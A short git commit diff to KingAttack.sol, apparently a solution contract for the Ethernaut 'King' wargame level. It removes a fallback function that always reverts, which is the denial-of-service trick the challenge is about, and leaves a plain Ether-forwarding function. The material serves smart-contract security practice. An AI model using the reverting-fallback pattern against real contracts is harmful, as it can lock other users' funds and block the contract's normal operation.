18b45baad34b08c92edbef0138132e530d582e3b
yeahokyok <yeahokyok@gmail.com>
2022-12-01 06:37:49 +0700

    King

--- King/KingAttack.sol
+++ King/KingAttack.sol
@@ -2,13 +2,8 @@
 pragma solidity 0.8.14;
 
 contract KingAttack {
-
     function attack(address payable _to) public payable {
-        (bool sent,) = _to.call{value: msg.value}("");
+        (bool sent, ) = _to.call{value: msg.value}("");
         require(sent, "Failed to send Ether");
-    }
-
-    fallback() external payable {
-        revert();
     }
 }
